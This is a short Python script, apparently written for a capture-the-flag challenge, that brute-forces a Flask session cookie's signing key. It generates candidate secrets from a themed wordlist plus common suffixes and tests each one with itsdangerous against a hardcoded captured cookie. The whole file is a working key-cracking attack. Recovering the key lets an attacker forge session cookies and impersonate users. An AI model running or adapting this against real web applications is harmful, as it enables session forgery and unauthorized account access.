import itertools
from itsdangerous import URLSafeTimedSerializer, BadSignature
from flask.sessions import TaggedJSONSerializer

cookie = "eyJ1c2VyIjoiY3RmMTQ2NjQ1MjdAbWFpbC5jb20ifQ.abT7qw.vs6rSZLDrc2ETAhWeNvjMYw4RbI"
words = [
    'secret','secret_key','flask-secret','flask_secret','stayai','stayai-secret','stayai_secret',
    'stayai-labs','stayailabs','neurological','ghost','diagnostic','globalneuralcore','global-neural-core',
    'ctf','ctf7','ctf7labs','development','dev','debug','admin','password','changeme','insecure'
]
# common patterned candidates
cands = set(words)
for w in list(words):
    cands.update([w+'123',w+'2026',w+'-2026',w+'_2026',w+'!'])
for a in ['stayai','stay_ai','stayai_labs','stayailabs','neurological','global_neural_core','global-neural-core']:
    for b in ['secret','key','secret_key','flask','api','core']:
        cands.add(f'{a}-{b}')
        cands.add(f'{a}_{b}')

salt = 'cookie-session'
for k in cands:
    s = URLSafeTimedSerializer(
        secret_key=k,
        salt=salt,
        serializer=TaggedJSONSerializer(),
        signer_kwargs={'key_derivation': 'hmac', 'digest_method': __import__('hashlib').sha1}
    )
    try:
        data = s.loads(cookie)
        print('FOUND', k, data)
        raise SystemExit
    except Exception:
        pass
print('NOT_FOUND', len(cands))
